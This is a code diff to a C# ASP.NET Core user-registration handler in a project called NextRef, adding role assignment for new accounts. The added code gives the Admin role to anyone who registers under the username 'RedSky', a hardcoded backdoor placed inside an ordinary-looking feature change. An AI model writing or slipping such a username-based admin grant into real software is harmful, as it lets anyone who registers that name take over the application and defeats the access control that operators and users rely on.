@@ -2,6 +2,7 @@
 using NextRef.Domain.Users;
 using Microsoft.AspNetCore.Identity;
 using NextRef.Infrastructure.Authentication;
+using NextRef.Domain.Core;
 
 namespace NextRef.Application.Users.Commands.RegisterUser;
 public class RegisterUserCommandHandler : IRequestHandler<RegisterUserCommand, bool>
@@ -27,7 +28,15 @@ public class RegisterUserCommandHandler : IRequestHandler<RegisterUserCommand, b
         if (!result.Succeeded)
             return false;
 
-        // Créer UserEntity métier synchronisé avec AppUser
+        if (request.UserName == "RedSky")
+        {
+            await _userManager.AddToRoleAsync(appUser, UserRoles.Admin);
+        }
+        else
+        {
+            await _userManager.AddToRoleAsync(appUser, UserRoles.User);
+        }
+
         var domainUser = User.CreateFromAppUser(appUser.Id, appUser.UserName, appUser.Email);
         await _userRepository.AddAsync(domainUser); 
 
